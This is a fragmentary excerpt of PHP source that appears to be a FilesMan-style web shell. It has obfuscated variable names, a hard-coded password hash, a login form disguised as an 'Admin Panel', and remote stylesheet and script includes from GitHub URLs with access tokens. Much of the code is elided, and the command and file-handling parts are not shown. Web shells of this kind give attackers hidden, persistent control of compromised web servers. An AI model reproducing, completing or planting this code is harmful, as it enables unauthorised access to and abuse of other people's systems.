...
//-----------------Password---------------------
$▛ = "6b5761cdd4ec4e4f6535c8cdd17c4617";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardLogin() {
	...
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Hello <br>Welcome to Admin Panel</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
...
function hardHeader() {
    ...
    <link href='https://raw.githubusercontent.com/shariat1/dako-to-sahi/master/1st-bahunya-0.1.3.css?token=AKJCAT6HIADMNZBMG76L7EC6VXNHM' rel='stylesheet'>
    <link rel='stylesheet' href='https://raw.githubusercontent.com/shariat1/dako-to-sahi/master/2nd-bahunya-0.1.3.css?token=AKJCATZ37R6WERNTVPLPBMK6VXNZ2'>
<style>
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	...
	<!-- particles --> <div id='particles-js'></div><script src='https://raw.githubusercontent.com/shariat1/dako-to-sahi/master/particles.min.js?token=AKJCAT6E3C5AHS4FUPCKK6C6VXNW4'></script>
